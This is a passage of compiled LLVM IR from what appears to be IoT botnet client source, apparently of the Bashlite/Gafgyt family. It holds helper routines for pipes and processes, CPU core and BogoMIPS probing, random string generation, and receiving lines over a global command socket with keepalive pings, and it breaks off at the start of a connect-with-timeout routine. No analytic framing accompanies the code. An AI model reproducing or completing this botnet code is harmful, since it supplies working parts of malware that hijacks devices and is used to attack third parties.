  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #12
  %26 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %7, i32 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !14

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !15

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i64 @parseHex(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !16

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @wildString(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getHost(i8* %0, %struct.in_addr* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @uppercase(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !17

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getBogos(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

13:                                               ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @uppercase(i8* %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %16 = call i8* @strstr(i8* %15, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0)) #11
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

19:                                               ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

22:                                               ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

27:                                               ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

37:                                               ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

39:                                               ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22, !llvm.loop !18

42:                                               ; preds = %37
  br label %43

43:                                               ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* %45) #11
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

52:                                               ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* %54) #11
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

61:                                               ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

63:                                               ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #11
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43, !llvm.loop !19

69:                                               ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* %70, i32 46) #11
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* %74, i32 46) #11
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* %77, i8* %78) #12
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 %80)
  store i32 0, i32* %2, align 4
  br label %87

82:                                               ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 4096, i1 false)
  br label %8, !llvm.loop !20

84:                                               ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1, i32* %2, align 4
  br label %87

87:                                               ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

5:                                                ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

10:                                               ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0)) #11
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

19:                                               ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 4096, i1 false)
  br label %5, !llvm.loop !21

21:                                               ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @makeRandomStr(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !22

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @recvLine(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.fd_set*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.fd_set*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.fd_set* %8, %struct.fd_set** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.fd_set*, %struct.fd_set** %11, align 8
  %31 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !23

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 %52, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.fd_set* %8, %struct.fd_set** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.fd_set*, %struct.fd_set** %15, align 8
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !24

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !25

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 %107, i8* %16, i64 1, i32 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %126

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !26

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* %18, align 4
  store i32 %125, i32* %4, align 4
  br label %126

126:                                              ; preds = %123, %110
  %127 = load i32, i32* %4, align 4
  ret i32 %127
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connectTimeout(i32 %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
